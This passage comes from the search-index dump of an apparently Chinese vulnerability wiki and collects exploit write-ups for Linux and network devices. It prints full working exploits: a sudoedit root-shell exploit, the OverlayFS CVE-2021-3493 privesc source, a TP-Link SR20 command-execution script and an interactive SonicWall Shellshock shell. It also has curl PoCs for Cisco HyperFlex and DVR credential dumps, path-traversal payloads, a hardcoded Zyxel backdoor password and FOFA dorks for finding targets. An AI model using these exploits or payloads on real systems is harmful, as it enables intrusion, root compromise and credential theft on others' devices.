.null_stomp_len = 60, .lc_all_len = 214 } }; void usage(char *prog) { printf(\" usage: %s \\n\\n\", prog); printf(\" available targets:\\n\"); printf(\" ------------------------------------------------------------\\n\"); for(int i = 0; i \\n\\n\"); if (argc != 2) { usage(argv[0]); return -1; } target_t *target = &targets[ atoi(argv[1]) ]; printf(\"using target: '%s'\\n\", target->target_name); char *smash_a = calloc(target->smash_len_a + 2, 1); char *smash_b = calloc(target->smash_len_b + 2, 1); memset(smash_a, 'A', target->smash_len_a); memset(smash_b, 'B', target->smash_len_b); smash_a[target->smash_len_a] = '\\\\'; smash_b[target->smash_len_b] = '\\\\'; char *s_argv[]={ \"sudoedit\", \"-s\", smash_a, \"\\\\\", smash_b, NULL }; char *s_envp[MAX_ENVP]; int envp_pos = 0; for(int i = 0; i null_stomp_len; i++) { s_envp[envp_pos++] = \"\\\\\"; } s_envp[envp_pos++] = \"X/P0P_SH3LLZ_\"; char *lc_all = calloc(target->lc_all_len + 16, 1); strcpy(lc_all, \"LC_ALL=C.UTF-8@\"); memset(lc_all+15, 'C', target->lc_all_len); s_envp[envp_pos++] = lc_all; s_envp[envp_pos++] = NULL; printf(\"** pray for your rootshell.. **\\n\"); execve(target->sudoedit_path, s_argv, s_envp); return 0; } lib.c #include #include #include #include static void __attribute__ ((constructor)) _init(void); static void _init(void) { printf(\"[+] bl1ng bl1ng! We got it!\\n\"); setuid(0); seteuid(0); setgid(0); setegid(0); static char *a_argv[] = { \"sh\", NULL }; static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL }; execv(\"/bin/sh\", a_argv); } 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Linux/Linux kernel权限提升漏洞 CVE-2021-3493.html":{"url":"book/操作系统漏洞/Linux/Linux kernel权限提升漏洞 CVE-2021-3493.html","title":"Linux kernel权限提升漏洞 CVE-2021-3493","keywords":"","body":"Linux kernel权限提升漏洞 CVE-2021-3493 漏洞描述 Ubuntu OverlayFS Local Privesc CVE-2021-3493 EXP在Github被公开，可以通过EXP在Ubuntu多个影响系统中提升 ROOT权限 漏洞影响 [!NOTE] Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM 漏洞复现 漏洞Github地址为： https://github.com/briskets/CVE-2021-3493 环境使用腾讯云的Ubuntu镜像即可 gcc exploit.c -o exploit chmod +x exploit ./exploit 下载并编译脚本 运行EXP成功提权 Root 漏洞POC #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include #include #include //#include //#include int setxattr(const char *path, const char *name, const void *value, size_t size, int flags); #define DIR_BASE \"./ovlcap\" #define DIR_WORK DIR_BASE \"/work\" #define DIR_LOWER DIR_BASE \"/lower\" #define DIR_UPPER DIR_BASE \"/upper\" #define DIR_MERGE DIR_BASE \"/merge\" #define BIN_MERGE DIR_MERGE \"/magic\" #define BIN_UPPER DIR_UPPER \"/magic\" static void xmkdir(const char *path, mode_t mode) { if (mkdir(path, mode) == -1 && errno != EEXIST) err(1, \"mkdir %s\", path); } static void xwritefile(const char *path, const char *data) { int fd = open(path, O_WRONLY); if (fd == -1) err(1, \"open %s\", path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, \"write %s\", path); close(fd); } static void xcopyfile(const char *src, const char *dst, mode_t mode) { int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, \"open %s\", src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, \"open %s\", dst); char buf[4096]; ssize_t rd, wr; for (;;) { rd = read(fi, buf, sizeof(buf)); if (rd == 0) { break; } else if (rd == -1) { if (errno == EINTR) continue; err(1, \"read %s\", src); } char *p = buf; while (rd > 0) { wr = write(fo, p, rd); if (wr == -1) { if (errno == EINTR) continue; err(1, \"write %s\", dst); } p += wr; rd -= wr; } } close(fi); close(fo); } static int exploit() { char buf[4096]; sprintf(buf, \"rm -rf '%s/'\", DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, \"unshare\"); xwritefile(\"/proc/self/setgroups\", \"deny\"); sprintf(buf, \"0 %d 1\", uid); xwritefile(\"/proc/self/uid_map\", buf); sprintf(buf, \"0 %d 1\", gid); xwritefile(\"/proc/self/gid_map\", buf); sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1) err(1, \"mount %s\", DIR_MERGE); // all+ep char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\"; xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777); if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1) err(1, \"setxattr %s\", BIN_MERGE); return 0; } int main(int argc, char *argv[]) { if (strstr(argv[0], \"magic\") || (argc > 1 && !strcmp(argv[1], \"shell\"))) { setuid(0); setgid(0); execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL); err(1, \"execl /bin/bash\"); } pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) { _exit(exploit()); } else { waitpid(child, NULL, 0); } execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL); err(1, \"execl %s\", BIN_UPPER); } 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/":{"url":"book/网络设备漏洞/","title":"网络设备漏洞","keywords":"","body":"网络设备漏洞🦊 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/ACTI/":{"url":"book/网络设备漏洞/ACTI/","title":"ACTI","keywords":"","body":"ACTI ACTI 视频监控 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/ACTI/ACTI 视频监控 任意文件读取漏洞.html":{"url":"book/网络设备漏洞/ACTI/ACTI 视频监控 任意文件读取漏洞.html","title":"ACTI 视频监控 任意文件读取漏洞","keywords":"","body":"ACTI 视频监控 任意文件读取漏洞 漏洞描述 ACTI 视频监控 存在任意文件读取漏洞 漏洞影响 [!NOTE] ACTI摄像头 FOFA [!NOTE] app=\"ACTi-视频监控\" 漏洞复现 登录页面如下 使用Burp抓包 /images/../../../../../../../../etc/passwd Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/DVR/":{"url":"book/网络设备漏洞/DVR/","title":"DVR","keywords":"","body":"DVR DVR 登录绕过漏洞 CVE-2018-9995 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/DVR/DVR 登录绕过漏洞 CVE-2018-9995.html":{"url":"book/网络设备漏洞/DVR/DVR 登录绕过漏洞 CVE-2018-9995.html","title":"DVR 登录绕过漏洞 CVE-2018-9995","keywords":"","body":"DVR 登录绕过漏洞 CVE-2018-9995 漏洞描述 DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。最初由阿根廷研究员发现，通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，DVR将以明文形式响应设备的管理员凭证。 漏洞影响 [!NOTE] Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login 漏洞复现 使用curl命令获得账号密码 curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list\" -H \"Cookie: uid=admin\" 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/TP-Link/":{"url":"book/网络设备漏洞/TP-Link/","title":"TP-Link","keywords":"","body":"TP-Link TP-Link SR20 远程命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/TP-Link/TP-Link SR20 远程命令执行.html":{"url":"book/网络设备漏洞/TP-Link/TP-Link SR20 远程命令执行.html","title":"TP-Link SR20 远程命令执行","keywords":"","body":"TP-Link SR20 远程命令执行 漏洞描述 据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。 漏洞影响 [!NOTE] TP-Link SR20 漏洞利用POC #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\"% 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(( '', port_receive)) # Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) packet = packet + b\"/testfile;arbitrary\" print(packet) sock_send.sendto(packet, ( \"192.168.0.1\", port_send)) sock_send.close() response, addr = sock_receive.recvfrom( 1024) r = response.encode( 'hex') print(r) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Kyan/":{"url":"book/网络设备漏洞/Kyan/","title":"Kyan","keywords":"","body":"Kyan Kyan 网络监控设备 账号密码泄露漏洞 Kyan 网络监控设备 run.php 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Kyan/Kyan 网络监控设备 账号密码泄露漏洞.html":{"url":"book/网络设备漏洞/Kyan/Kyan 网络监控设备 账号密码泄露漏洞.html","title":"Kyan 网络监控设备 账号密码泄露漏洞","keywords":"","body":"Kyan 网络监控设备 账号密码泄露漏洞 漏洞描述 Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限 漏洞影响 [!NOTE] Kyan FOFA [!NOTE] title=\"platform - Login\" 漏洞复现 登录页面如下 POC http://xxx.xxx.xxx.xxx/hosts 成功获得账号密码 Goby & POC [!NOTE] Kyan design account password disclosure 参考文章 https://www.secquan.org/BugWarning/1071987 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Kyan/Kyan 网络监控设备 run.php 远程命令执行漏洞.html":{"url":"book/网络设备漏洞/Kyan/Kyan 网络监控设备 run.php 远程命令执行漏洞.html","title":"Kyan 网络监控设备 run.php 远程命令执行漏洞","keywords":"","body":"Kyan 网络监控设备 run.php 远程命令执行漏洞 漏洞描述 Kyan 网络监控设备 run.php可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞 漏洞影响 [!NOTE] Kyan FOFA [!NOTE] title=\"platform - Login\" 漏洞复现 登录页面如下 使用 Gobuster扫描文件 其中 run.php 文件内容为 Shell Execute 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Cisco/":{"url":"book/网络设备漏洞/Cisco/","title":"Cisco","keywords":"","body":"Cisco CISCO ASA设备任意文件读取漏洞 CVE-2020-3452 Cisco ASA设备任意文件删除漏洞 CVE-2020-3187 Cisco HyperFlex HX storfs-asup 远程命令执行漏洞 CVE-2021-1497 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Cisco/Cisco ASA设备任意文件读取漏洞 CVE-2020-3452.html":{"url":"book/网络设备漏洞/Cisco/Cisco ASA设备任意文件读取漏洞 CVE-2020-3452.html","title":"Cisco ASA设备任意文件读取漏洞 CVE-2020-3452","keywords":"","body":"Cisco ASA设备任意文件读取漏洞 CVE-2020-3452 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/网络设备漏洞/Cisco/Cisco ASA设备任意文件删除漏洞 CVE-2020-3187.html":{"url":"book/网络设备漏洞/Cisco/Cisco ASA设备任意文件删除漏洞 CVE-2020-3187.html","title":"Cisco ASA设备任意文件删除漏洞 CVE-2020-3187","keywords":"","body":"Cisco ASA设备任意文件删除漏洞 CVE-2020-3187 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/网络设备漏洞/Cisco/Cisco HyperFlex HX storfs-asup 远程命令执行漏洞 CVE-2021-1497.html":{"url":"book/网络设备漏洞/Cisco/Cisco HyperFlex HX storfs-asup 远程命令执行漏洞 CVE-2021-1497.html","title":"Cisco HyperFlex HX storfs-asup 远程命令执行漏洞 CVE-2021-1497","keywords":"","body":"Cisco HyperFlex HX storfs-asup 远程命令执行漏洞 CVE-2021-1497 漏洞描述 思科在研究人员Nikita Abramov和Mikhail Klyuchnikov发现的HyperFlex HX数据平台中修复了两个Unauth RCE和一个任意文件上载 漏洞影响 [!NOTE] Cisco HyperFlex HX 漏洞复现 出现漏洞的代码 protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String action = request.getParameter(\"action\"); if (action == null) { String msg = \"Action for the servlet need be specified.\"; writeErrorResponse(response, msg); return; } try { String token = request.getParameter(\"token\"); StringBuilder cmd = new StringBuilder(); cmd.append(\"exec /bin/storfs-asup \"); cmd.append(token); String mode = request.getParameter(\"mode\"); cmd.append(\" \"); cmd.append(mode); cmd.append(\" > /dev/null\"); logger.info(\"storfs-asup cmd to run : \" + cmd); ProcessBuilder pb = new ProcessBuilder(new String[] { \"/bin/bash\", \"-c\", cmd.toString() }); logger.info(\"Starting the storfs-asup now: \"); long startTime = System.currentTimeMillis(); Process p = pb.start(); InputStream errStream = p.getErrorStream(); String errMsg = FileUtils.readToString(errStream); int exitCode = p.waitFor(); long timeTaken = System.currentTimeMillis() - startTime; logger.info(\"storfs-asup command completed in (\" + timeTaken + \" ) milliseconds, with exit code (\" + exitCode + \") and error message: \" + errMsg); errStream.close(); OutputStream outStream = p.getOutputStream(); outStream.flush(); outStream.close(); if (exitCode != 0) throw new Exception(errMsg); } catch (IOException ex) { logger.error(\"Failed to generate asup: \" + ex); } catch (Exception ie) { logger.error(\"Failed to run the /bin/storfs-asup command.\"); } finally { logger.info(\"Done executing asup command. \"); } } POC为 curl -v http://xxx.xxx.xxx.xxx/storfs-asup -d 'action=&token=`id`&mode=`id`' 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Cisco/Cisco HyperFlex HX upload 任意文件上传漏洞 CVE-2021-1499.html":{"url":"book/网络设备漏洞/Cisco/Cisco HyperFlex HX upload 任意文件上传漏洞 CVE-2021-1499.html","title":"Cisco HyperFlex HX upload 任意文件上传漏洞 CVE-2021-1499","keywords":"","body":"Cisco HyperFlex HX upload 任意文件上传漏洞 CVE-2021-1499 漏洞描述 思科在研究人员Nikita Abramov和Mikhail Klyuchnikov发现的HyperFlex HX数据平台中修复了两个Unauth RCE和一个任意文件上载 漏洞影响 [!NOTE] Cisco HyperFlex HX 漏洞复现 出现漏洞的代码为 public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.isMultipart = ServletFileUpload.isMultipartContent(request); response.setContentType(\"application/json\"); PrintWriter out = response.getWriter(); if (!this.isMultipart) { out.println(\"{\\\"result\\\": \\\"Invalid content-type.\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Invalid content-type. Must be multi-part\\\"}\"); response.setStatus(400); return; } ServletFileUpload upload = new ServletFileUpload(); upload.setSizeMax(this.maxFileSize); FileOutputStream fout = null; InputStream stream = null; try { FileItemIterator iter = upload.getItemIterator(request); while (iter.hasNext()) { try { FileItemStream fi = iter.next(); stream = fi.openStream(); String uploadedFileName = this.dirPath + \"/\" + fi.getName(); File uploadedFile = new File(uploadedFileName); fout = new FileOutputStream(uploadedFile); byte[] buffer = new byte[1024]; int len; while ((len = stream.read(buffer, 0, buffer.length)) != -1) fout.write(buffer, 0, len); out.println(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); logger.debug(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); } catch (org.apache.commons.fileupload.MultipartStream.MalformedStreamException ex) { logger.info(\"MalformedStreamException during file upload servlet stream processing: \" + ex); } finally { if (fout != null) { logger.info(\"Closing fout\"); fout.close(); } if (stream != null) { logger.info(\"Closing stream\"); stream.close(); } } } } catch (Exception ex) { out.println(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"Exception during file upload servlet stream processing: \" + ex); response.setStatus(500); } POC为 curl -v http://xxx.xxx.xxx.xxx/upload -F x=@/dev/null 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Zyxel/":{"url":"book/网络设备漏洞/Zyxel/","title":"Zyxel","keywords":"","body":"Zyxel Zyxel 硬编码后门账户漏洞 CVE-2020-29583 Zyxel NBG2105 身份验证绕过 CVE-2021-3297 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Zyxel/Zyxel 硬编码后门账户漏洞 CVE-2020-29583.html":{"url":"book/网络设备漏洞/Zyxel/Zyxel 硬编码后门账户漏洞 CVE-2020-29583.html","title":"Zyxel 硬编码后门账户漏洞 CVE-2020-29583","keywords":"","body":"Zyxel 硬编码后门账户漏洞 CVE-2020-29583 漏洞描述 Zyxel固件中发现的后门被称为关键固件漏洞，CVE编号CVE-2020-29583，得分为7.8 CVSS。虽然CVSS评分看似不是很高，但却不可小觑。研究人员表示，这是一个极为严重的漏洞，所有者必须立即更新其系统。因为任何人都可以轻松利用这个漏洞，从DDoS僵尸网络运营商到勒索软件团体和政府资助的黑客。 通过滥用后门账户，网络罪犯可以访问易受攻击的设备并感染内部网络以发起其他攻击。攻击者可以使用管理特权登录设备，并轻易破坏网络设备。 漏洞影响 [!NOTE] Zyxel USG系列 Zyxel ATP系列 Zyxel NCX系列 Zyxel USG FIEX系列 Zyxel VPN系列 FOFA [!NOTE] title=\"USG40\" \"NXC2500\" 等 漏洞复现 分析固件中有 FTP 的后门密码 使用漏洞扫描脚本找到易受攻击的版本 进行攻击，登录为后门管理员账户 zyfwp:PrOw!aN_fXp 这里使用Goby设置字典扫描即可 参考文章 scan_CVE-2020-29583 Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583） 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Zyxel/Zyxel NBG2105 身份验证绕过 CVE-2021-3297.html":{"url":"book/网络设备漏洞/Zyxel/Zyxel NBG2105 身份验证绕过 CVE-2021-3297.html","title":"Zyxel NBG2105 身份验证绕过 CVE-2021-3297","keywords":"","body":"Zyxel NBG2105 身份验证绕过 CVE-2021-3297 漏洞描述 Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆 漏洞影响 [!NOTE] Zyxel NBG2105 FOFA [!NOTE] app=\"ZyXEL-NBG2105\" 漏洞复现 登录页面如下 其中前端文件 /js/util_gw.js 存在前端对 Cookie login参数的校验 可以看到检测到 Cookie中的 login=1 则跳转 home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } 请求如下则会以管理员身份跳转到 home.htm页面 http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1; 参考文章 https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/SonicWall/":{"url":"book/网络设备漏洞/SonicWall/","title":"SonicWall","keywords":"","body":"SonicWall SSL-VPN 远程命令执行漏洞 SonicWall SSL-VPN 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/SonicWall/SonicWall SSL-VPN 远程命令执行漏洞.html":{"url":"book/网络设备漏洞/SonicWall/SonicWall SSL-VPN 远程命令执行漏洞.html","title":"SonicWall SSL-VPN 远程命令执行漏洞","keywords":"","body":"SonicWall SSL-VPN 远程命令执行漏洞 漏洞描述 SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞 漏洞影响 [!NOTE] SonicWall SSL-VPN FOFA [!NOTE] app=\"SONICWALL-SSL-VPN\" 漏洞复现 出现漏洞的文件为 /cgi-bin/jarrewrite.sh #!/bin/bash # jarrewrite.sh: # Script takes a jar/class file and a working directory; modifies class files # within the jar and repackages them. USAGE_STR=\"Usage: $0 \" # Validate number of args if [ $# -ne 2 ]; then echo ${USAGE_STR}; exit -1; fi for param in $*; do if [ \"$param\" == \"-h\" ]; then echo ${USAGE_STR}; exit 1; fi done # constants BOUNDARY=\"-------------------------------------------------------------\" BASE_DIR=/tmp JAVA_SRC=$1 WDIR=$2 CWD=`pwd` FULL_JAVA_SRC_PATH=${BASE_DIR}/${WDIR}/${JAVA_SRC} CLASSES_DIR=classes META_INF_DIR=${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF MANIFEST=${META_INF_DIR}/MANIFEST.MF MANIFEST_DIGEST_FILE=${META_INF_DIR}/SWALL_SIGNATURE.SF SIGNATURE_FILE=${META_INF_DIR}/SWALL_SIGNATURE.DSA CODESIGNER_CRT=./../../var/cs_cert/httprpCodeSignerX509Crt.pem CODESIGNER_PVTKEY=./../../var/cs_cert/httprpCodeSignerPvtkey.pem DO_SIGN=0 if [ ! -f ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi if [ ${JAVA_SRC##*.} == \"jar\" ] # Using bracket in variable substitution. then # organize mkdir ${BASE_DIR}/$WDIR/$CLASSES_DIR # unzip jar unzip -d ${BASE_DIR}/${WDIR}/${CLASSES_DIR} ${FULL_JAVA_SRC_PATH}; # Simple sanity check to see if the JAR has already been signed. # FIXME: This is not a complete check,because the original JAR signature # has to be verified completely otherwise a malicious applet # could access the local resources with SSL VPN signing it. old_sf_files=`/bin/ls ${META_INF_DIR}/*.[sS][fF] ` old_sign_files=`/bin/ls ${META_INF_DIR}/*.[rRdD][sS][aA] ` for sf_file in $old_sf_files do for sign_file in $old_sign_files do DO_SIGN=1; break done; break; done # remove all manifest info including signatures # remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA rm -f ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.[sSmM][fF] ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.?[sS][aA] OUTPUT_JAR=\"${FULL_JAVA_SRC_PATH}\" classfiles=`/usr/bin/find ${BASE_DIR}/${WDIR}/${CLASSES_DIR} -type f` #New Manifest file MANIFEST_MAIN_ATTR=\"Manifest-Version: 1.0\\nCreated-By: 1.0 (SonicWALL Inc.)\\n\" echo -e \"Creating Manifest file ... \" echo -e ${MANIFEST_MAIN_ATTR} > ${MANIFEST} for file in $classfiles do echo $BOUNDARY echo $file echo $BOUNDARY ./jdasm $file $file #Update manifest file SHA1_MANIFEST_ENTRY_CLASS=`openssl dgst -sha1 -binary $file | openssl base64` MANIFEST_ENTRY=\"Name: ${file##${BASE_DIR}/${WDIR}/${CLASSES_DIR}/}\\nSHA1-Digest: ${SHA1_MANIFEST_ENTRY_CLASS}\\n\" echo -e ${MANIFEST_ENTRY} >> ${MANIFEST} echo $BOUNDARY done if [ ${DO_SIGN} == 1 ]; then echo -e \"Creating Manifest Signature file and Signature block\" >> $OUTLOG /usr/sbin/sw_jarsigner -m ${MANIFEST} -s ${MANIFEST_DIGEST_FILE} -S ${SIGNATURE_FILE} -c ${CODESIGNER_CRT} -k ${CODESIGNER_PVTKEY} fi rm -f ${FULL_JAVA_SRC_PATH} cd ${BASE_DIR}/${WDIR}/${CLASSES_DIR}; zip -r ${OUTPUT_JAR} * cd ${CWD} # clean rm -Rf ${BASE_DIR}/${WDIR}/${CLASSES_DIR} elif [ ${JAVA_SRC##*.} == \"class\" ]; then # if file is a class if [ ! -e ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi ./jdasm ${FULL_JAVA_SRC_PATH} ${FULL_JAVA_SRC_PATH}; fi echo \"Recursive Class Rewrite Completed.\" exit 0; 这个文件存在命令注入漏洞，漏洞触发在 Usage-Agent 发送如下请求即可命令执行 GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd' 发送请求会下载一个文件，文件内容为命令执行的结果 漏洞利用POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/cgi-bin/jarrewrite.sh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 SonicWall_SSL_VPN_RCE.json 参考文章 https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/KEDACOM/":{"url":"book/网络设备漏洞/KEDACOM/","title":"KEDACOM","keywords":"","body":"KEDACOM KEDACOM 数字系统接入网关 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/KEDACOM/KEDACOM数字系统接入网关 任意文件读取漏洞.html":{"url":"book/网络设备漏洞/KEDACOM/KEDACOM数字系统接入网关 任意文件读取漏洞.html","title":"KEDACOM数字系统接入网关 任意文件读取漏洞","keywords":"","body":"KEDACOM 数字系统接入网关 任意文件读取漏洞 漏洞描述 KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件 漏洞影响 [!NOTE] KEDACOM 数字系统接入网关 FOFA [!NOTE] (app=\"KEDACOM-DVR接入网关\") && (is_honeypot=false && is_fraud=false) 漏洞复现 登录页面如下 使用POC读取 /etc/hosts /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/H3C/":{"url":"book/网络设备漏洞/H3C/","title":"H3C","keywords":"","body":"H3C H3C SecPath 下一代防火墙 任意文件下载漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/H3C/H3C SecPath 下一代防火墙  任意文件下载漏洞.html":{"url":"book/网络设备漏洞/H3C/H3C SecPath 下一代防火墙  任意文件下载漏洞.html","title":"H3C SecPath 下一代防火墙  